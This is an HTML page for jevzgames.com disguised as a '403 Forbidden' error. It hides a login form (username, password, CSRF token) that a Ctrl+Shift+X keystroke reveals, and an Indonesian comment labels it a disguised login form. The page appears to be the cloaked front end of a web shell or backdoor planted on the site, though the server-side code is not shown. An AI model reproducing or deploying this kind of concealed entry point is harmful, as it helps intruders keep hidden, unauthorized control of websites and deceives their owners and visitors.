
    <!doctype html>
    <html lang="en">
    <head>
        <meta charset="utf-8">
        <title>403 Forbidden</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body {
                background-color: #ffffff;
                color: #000000;
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
                margin: 0;
                padding: 0;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                height: 100vh;
                text-align: center;
            }
            .container {
                max-width: 600px;
                padding: 20px;
            }
            h1 {
                font-size: 48px;
                font-weight: 700;
                margin: 0 0 10px 0;
                color: #333;
            }
            h2 {
                font-size: 24px;
                font-weight: 400;
                margin: 0 0 20px 0;
                color: #555;
            }
            p {
                font-size: 14px;
                color: #777;
                margin-bottom: 30px;
            }
            .auth-box {
                margin-top: 40px;
                padding: 20px;
                border: 1px solid #ddd;
                border-radius: 4px;
                background: #f9f9f9;
                display: none;
            }
            .auth-box.force-show {
                display: block;
            }
            input {
                padding: 8px;
                margin: 5px 0;
                border: 1px solid #ccc;
                border-radius: 3px;
                width: 200px;
                font-size: 13px;
            }
            button {
                padding: 8px 16px;
                background: #eee;
                border: 1px solid #ccc;
                border-radius: 3px;
                cursor: pointer;
                font-size: 13px;
            }
            button:hover {
                background: #ddd;
            }
            .error-msg {
                color: #d9534f;
                font-size: 13px;
                margin-bottom: 10px;
            }
            hr {
                border: 0;
                border-top: 1px solid #eee;
                margin: 20px 0;
            }
            .server-signature {
                font-size: 12px;
                color: #aaa;
                margin-top: 50px;
            }
        </style>
        <script>

            document.addEventListener('keydown', function(e) {
                if (e.ctrlKey && e.shiftKey && e.key === 'X') {
                    var box = document.querySelector('.auth-box');
                    if (box) box.classList.add('force-show');
                }
            });
        </script>
    </head>
    <body>
        <div class="container">
            <h1>403 Forbidden</h1>
            <h2>You don't have permission to access this resource.</h2>
            <hr>

            <!-- Form Login Disamarkan -->
            <div class="auth-box ">
                
                <form method="post" action="?a=login">
                    <input type="hidden" name="csrf" value="6a9d17321d43980725dc87e37073b1a5">
                    <div>
                        <input name="user" type="text" placeholder="Username" required autocomplete="off">
                    </div>
                    <div>
                        <input name="pass" type="password" placeholder="Password" required autocomplete="off">
                    </div>
                    <button type="submit">Authenticate</button>
                </form>
            </div>
            
            <div class="server-signature">
                Server at jevzgames.com
            </div>
        </div>
    </body>
    </html>
